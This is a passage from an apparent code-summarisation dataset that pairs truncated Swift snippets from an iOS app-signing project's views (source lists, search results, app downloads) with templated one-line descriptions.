    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/SwitchViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "3192",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\nswitchControl.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),\nswitchControl.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -22),\n])\n}\n}\n",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/SwitchViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3193",
    "code": "class TweakLibraryViewCell: UITableViewCell {\nvar segmentedControl: UISegmentedControl = {",
    "nl": "class TweakLibraryViewCell - implements functionality related to tweak library view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/TweakLibraryViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "3194",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\nsegmentedControl.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),\nsegmentedControl.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 15),\nsegmentedControl.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -15),\n])\n}\n\nfunc configureSegmentedControl(with items: [String], selectedIndex: Int) {",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/TweakLibraryViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3195",
    "code": "func configureSegmentedControl(with items: [String], selectedIndex: Int) {\nsegmentedControl.removeAllSegments()\nfor (index, item) in items.enumerated() {",
    "nl": "Function configureSegmentedControl - implements configuresegmentedcontrol functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/TweakLibraryViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3196",
    "code": "enum JSONValidationStatus {\ncase notStarted\ncase notValidJSON\ncase validJSON\n}\n\n// MARK: - RepoViewController\n\nstruct RepoViewController: View {",
    "nl": "MARK: - Validation Status Enum",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "3197",
    "code": "struct RepoViewController: View {\n// MARK: - Properties\n\n@Environment(\\.presentationMode) var presentationMode\n@State private var repoName: String = \"\"\n@State private var validationStatus: JSONValidationStatus = .notStarted\n@State private var debounceWorkItem: DispatchWorkItem?\n@State private var isVerifying: Bool = false\n@State private var isSyncing: Bool = false\n@State var sources: [Source]?",
    "nl": "MARK: - RepoViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "3198",
    "code": "extension RepoViewController {\nprivate func debounceRequest() {",
    "nl": "MARK: - Validation Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3199",
    "code": "private func debounceRequest() {\nisVerifying = true\ndebounceWorkItem?.cancel()\n\nlet workItem = DispatchWorkItem { [self] in",
    "nl": "Function debounceRequest - implements debouncerequest functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3200",
    "code": "private func validateJSON() {\nguard let url = URL(string: repoName), url.scheme == \"https\" else {",
    "nl": "Function validateJSON - implements validatejson functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3201",
    "code": "extension RepoViewController {\nfunc decodeRepositories(text: String) {",
    "nl": "MARK: - Repository Decoding",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3202",
    "code": "func decodeRepositories(text: String) {\nisSyncing = true\nlet isBase64 = isValidBase64String(text)\nlet repoLinks: [String]\nDebug.shared.log(message: \"Trying to add repositories...\")\n\nif text.hasPrefix(\"source[\") {",
    "nl": "Function decodeRepositories - implements decoderepositories functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3203",
    "code": "private func isValidBase64String(_ string: String) -> Bool {\nreturn Data(base64Encoded: string) != nil\n}\n\nprivate func decodeBase64String(_ base64String: String) -> String? {",
    "nl": "Function isValidBase64String - checks if validbase64string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3204",
    "code": "private func decodeBase64String(_ base64String: String) -> String? {\nguard let data = Data(base64Encoded: base64String),\nlet decodedString = String(data: data, encoding: .utf8)\nelse {",
    "nl": "Function decodeBase64String - implements decodebase64string functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3205",
    "code": "class SearchResultsTableViewController: UIViewController,\nUISearchResultsUpdating,\nUITableViewDataSource,\nUITableViewDelegate\n{",
    "nl": "MARK: - SearchResultsTableViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3206",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupTableView()\nsetupActivityIndicator()\n}\n\noverride func viewDidAppear(_ animated: Bool) {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3207",
    "code": "override func viewDidAppear(_ animated: Bool) {\nsuper.viewDidAppear(animated)\nfetchAppsForSources()\n}\n\n// MARK: - UI Setup\n\nprivate func setupTableView() {",
    "nl": "Function viewDidAppear - implements viewdidappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3208",
    "code": "private func setupTableView() {\ntableView = UITableView(frame: .zero, style: .insetGrouped)\ntableView.backgroundColor = .background\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"Cell\")\nview.addSubview(tableView)\ntableView.translatesAutoresizingMaskIntoConstraints = false\n\nNSLayoutConstraint.activate([\ntableView.topAnchor.constraint(equalTo: view.topAnchor),\ntableView.bottomAnchor.constraint(equalTo: view.bottomAnchor),",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3209",
    "code": "private func setupActivityIndicator() {\nactivityIndicator = UIActivityIndicatorView(style: .medium)\nactivityIndicator.center = CGPoint(x: view.center.x, y: view.center.y)\nactivityIndicator.hidesWhenStopped = true\nactivityIndicator.startAnimating()\nview.addSubview(activityIndicator)\n}\n\n// MARK: - UITableViewDataSource\n",
    "nl": "Function setupActivityIndicator - sets upactivityindicator",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3210",
    "code": "func numberOfSections(in _: UITableView) -> Int {\nreturn filteredSources.keys.count\n}\n\nfunc tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3211",
    "code": "func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nlet source = Array(filteredSources.keys)[section]\nreturn filteredSources[source]?.count ?? 0\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3212",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = UITableViewCell(style: .subtitle, reuseIdentifier: \"Cell\")\nconfigureCell(cell, at: indexPath, in: tableView)\nreturn cell\n}\n\n// MARK: - UITableViewDelegate\n\nfunc tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3213",
    "code": "func tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat {\nreturn 40\n}\n\nfunc tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3214",
    "code": "func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nlet source = Array(filteredSources.keys)[section]\nlet header = SearchAppSectionHeader(title: source.name ?? \"Unknown\", icon: UIImage(named: \"unknown\"))\nlet iconURL = source.iconURL ?? source.apps.first?.iconURL\nloadAndSetImage(from: iconURL, for: header)\nreturn header\n}\n\nfunc tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3215",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\npresentAppDetail(for: indexPath)\ntableView.deselectRow(at: indexPath, animated: true)\n}\n\n// MARK: - Cell Configuration\n\nprivate func configureCell(_ cell: UITableViewCell, at indexPath: IndexPath, in tableView: UITableView) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3216",
    "code": "private func configureCell(_ cell: UITableViewCell, at indexPath: IndexPath, in tableView: UITableView) {\nlet source = Array(filteredSources.keys)[indexPath.section]\nlet app = filteredSources[source]?[indexPath.row]\n\n// Configure app name\nvar appname = app?.name ?? String.localized(\"UNKNOWN\")\nif app?.bundleIdentifier.hasSuffix(\"Beta\") == true {",
    "nl": "MARK: - Cell Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3217",
    "code": "private func configureImageView(\nfor cell: UITableViewCell,\nwith app: StoreAppsData?,\nat indexPath: IndexPath,\nin tableView: UITableView\n) {",
    "nl": "Function configureImageView - implements configureimageview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3218",
    "code": "func setImage(_ image: UIImage?) {\nlet resizedImage = UIGraphicsImageRenderer(size: imageSize).image { _ in",
    "nl": "Function setImage - sets image",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3219",
    "code": "private func presentAppDetail(for indexPath: IndexPath) {\nlet source = Array(filteredSources.keys)[indexPath.section]\nlet app = filteredSources[source]?[indexPath.row]\n\nguard let url = sourceURLMapping[source] else { return }",
    "nl": "MARK: - App Detail Presentation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3220",
    "code": "private func loadAndSetImage(from url: URL?, for header: SearchAppSectionHeader) {\nguard let url = url else {",
    "nl": "MARK: - Header Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3221",
    "code": "func updateSearchResults(for searchController: UISearchController) {\nlet searchText = searchController.searchBar.text?.trimmingCharacters(in: .whitespacesAndNewlines) ?? \"\"\n\nif !dataFetched {",
    "nl": "MARK: - UISearchResultsUpdating",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3222",
    "code": "private func fetchAppsForSources() {\nlet dispatchGroup = DispatchGroup()\nvar allSources: [URL: SourcesData] = [:]\nsourceURLMapping.removeAll()\n\nfor source in sources {",
    "nl": "MARK: - Data Fetching",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3223",
    "code": "class SourcesViewController: UITableViewController {\nvar sources: [Source] = []\nvar searchController: UISearchController!\nlet searchResultsTableViewController = SearchResultsTableViewController()\n\ninit() { super.init(style: .grouped) }",
    "nl": "class SourcesViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3224",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupViews()\nsetupSearchController()\nfetchSources()\n}\n\noverride func viewWillAppear(_ animated: Bool) {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3225",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\nsetupNavigation()\n}\n\nfileprivate func setupViews() {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3226",
    "code": "fileprivate func setupViews() {\ntableView.dataSource = self\n\ntableView.delegate = self\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"Cell\")\ntableView.refreshControl = refreshControl\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(fetch),\nname: Notification.Name(\"sfetch\"),",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3227",
    "code": "fileprivate func setupNavigation() {\nnavigationController?.navigationBar.prefersLargeTitles = true\nnavigationItem.largeTitleDisplayMode = .always\ntitle = String.localized(\"TAB_SOURCES\")\n}\n}\n\n// MARK: - Tabelview\n\nextension SourcesViewController {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3228",
    "code": "extension SourcesViewController {\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "MARK: - Tabelview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3229",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3230",
    "code": "override func numberOfSections(in _: UITableView) -> Int { return 2 }\noverride func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat { return 70 }",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3231",
    "code": "override func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat { return 70 }\n\noverride func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3232",
    "code": "override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nif section == 1 {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3233",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = UITableViewCell(style: .subtitle, reuseIdentifier: \"Cell\")\n\ncell.textLabel?.font = UIFont.boldSystemFont(ofSize: 17)\ncell.detailTextLabel?.font = UIFont.systemFont(ofSize: 13)\ncell.detailTextLabel?.textColor = .secondaryLabel\ncell.accessoryType = .disclosureIndicator\ncell.backgroundColor = .clear\n\nswitch indexPath.section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3234",
    "code": "override func tableView(_: UITableView, contextMenuConfigurationForRowAt indexPath: IndexPath,\npoint _: CGPoint) -> UIContextMenuConfiguration?\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3235",
    "code": "override func tableView(_: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)\n-> UISwipeActionsConfiguration?\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3236",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nif sources.isEmpty {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3237",
    "code": "extension SourcesViewController {\n@objc func fetch() { fetchSources() }",
    "nl": "extension SourcesViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3238",
    "code": "@objc func fetch() { fetchSources() }\nfunc fetchSources() {",
    "nl": "Function fetch - implements fetch functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3239",
    "code": "func fetchSources() {\nsources = CoreDataManager.shared.getAZSources()\nsearchResultsTableViewController.sources = sources\nDispatchQueue.main.async {",
    "nl": "Function fetchSources - implements fetchsources functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3240",
    "code": "extension SourcesViewController: UISearchControllerDelegate, UISearchBarDelegate {\nfunc setupSearchController() {",
    "nl": "extension SourcesViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3241",
    "code": "func setupSearchController() {\nsearchController = UISearchController(searchResultsController: searchResultsTableViewController)\nsearchController.obscuresBackgroundDuringPresentation = true\nsearchController.hidesNavigationBarDuringPresentation = true\nsearchController.delegate = self\nsearchController.searchBar.placeholder = String.localized(\"SOURCES_VIEW_CONTROLLER_SEARCH_SOURCES\")\nsearchController.searchResultsUpdater = searchResultsTableViewController\nsearchResultsTableViewController.sources = sources\nnavigationItem.searchController = searchController\ndefinesPresentationContext = true",
    "nl": "Function setupSearchController - sets upsearchcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3242",
    "code": "extension SourceAppViewController {\n// MARK: - Download Button Actions\n\n@objc func getButtonTapped(_ sender: UIButton) {",
    "nl": "MARK: - SourceAppViewController Button Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "extension"
  },
  {
    "id": "3243",
    "code": "@objc func getButtonTapped(_ sender: UIButton) {\nlet indexPath = IndexPath(row: sender.tag, section: 0)\nguard let app = getAppAt(indexPath: indexPath) else { return }",
    "nl": "MARK: - Download Button Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "function"
  },
  {
    "id": "3244",
    "code": "private func getAppAt(indexPath: IndexPath) -> StoreAppsData? {\nguard indexPath.row < (isFiltering ? filteredApps.count : apps.count) else { return nil }",
    "nl": "Function getAppAt - retrieves appat",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "function"
  },
  {
    "id": "3245",
    "code": "private func getDownloadURL(for app: StoreAppsData) -> URL? {\nif let appDownloadURL = app.versions?.first?.downloadURL {",
    "nl": "Function getDownloadURL - retrieves downloadurl",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "function"
  },
  {
    "id": "3246",
    "code": "private func handleDownloadAction(for appUUID: String, at indexPath: IndexPath, downloadURL: URL) {\nif let task = DownloadTaskManager.shared.task(for: appUUID) {",
    "nl": "Function handleDownloadAction - implements handledownloadaction functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "function"
  },
  {
    "id": "3247",
    "code": "@objc func getButtonHold(_ gesture: UILongPressGestureRecognizer) {\nguard gesture.state == .began,\nlet button = gesture.view as? UIButton else { return }",
    "nl": "MARK: - Long Press Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "function"
  },
  {
    "id": "3248",
    "code": "private func addVersionActions(\nto alertController: UIAlertController,\nfor app: StoreAppsData,\nat indexPath: IndexPath\n) {",
    "nl": "Function addVersionActions - implements addversionactions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "function"
  },
  {
    "id": "3249",
    "code": "private func presentAlertController(_ alertController: UIAlertController) {\nDispatchQueue.main.async {",
    "nl": "Function presentAlertController - implements presentalertcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift",
    "code_type": "function"
  },
  {
    "id": "3250",
    "code": "extension SourceAppViewController: DownloadDelegate {\nfunc stopDownload(uuid: String) {",
    "nl": "extension SourceAppViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "extension"
  },
  {
    "id": "3251",
    "code": "func stopDownload(uuid: String) {\nDispatchQueue.main.async {",
    "nl": "Function stopDownload - implements stopdownload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3252",
    "code": "func startDownload(uuid: String, indexPath _: IndexPath) {\nDispatchQueue.main.async {",
    "nl": "Function startDownload - implements startdownload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3253",
    "code": "func updateDownloadProgress(progress: Double, uuid: String) {\nDownloadTaskManager.shared.updateTask(uuid: uuid, state: .inProgress(progress: progress))\n}\n}\n\nextension SourceAppViewController {",
    "nl": "Function updateDownloadProgress - updates downloadprogress",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3254",
    "code": "extension SourceAppViewController {\nfunc startDownloadIfNeeded(\nfor indexPath: IndexPath,\nin tableView: UITableView,\ndownloadURL: URL?,\nappUUID: String?,\nsourceLocation: String\n) {",
    "nl": "extension SourceAppViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "extension"
  },
  {
    "id": "3255",
    "code": "func startDownloadIfNeeded(\nfor indexPath: IndexPath,\nin tableView: UITableView,\ndownloadURL: URL?,\nappUUID: String?,\nsourceLocation: String\n) {",
    "nl": "Function startDownloadIfNeeded - implements startdownloadifneeded functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3256",
    "code": "private func setupCellForDownload(_ cell: AppTableViewCell) {\nif cell.appDownload == nil {",
    "nl": "MARK: - Private Download Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3257",
    "code": "private func showDownloadAnimation(in cell: AppTableViewCell) -> UIView {\n// Show download animation in cell\nlet animationView = cell.addAnimatedIcon(\nsystemName: \"arrow.down.circle\",\ntintColor: .systemBlue,\nsize: CGSize(width: 40, height: 40)\n)\n\n// Position animation in the cell\nanimationView.translatesAutoresizingMaskIntoConstraints = false",
    "nl": "Function showDownloadAnimation - implements showdownloadanimation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3258",
    "code": "private func downloadFile(downloadURL: URL, appUUID: String, indexPath: IndexPath) async throws -> URL {\n// Create a temporary file path for the download\nlet tempDir = FileManager.default.temporaryDirectory\nlet filePath = tempDir.appendingPathComponent(\"app_\\(appUUID).ipa\")\n\n// Start download and show progress\nstartDownload(uuid: appUUID, indexPath: indexPath)\n\n// Download file with URLSession\nlet request = URLRequest(url: downloadURL)",
    "nl": "Function downloadFile - implements downloadfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3259",
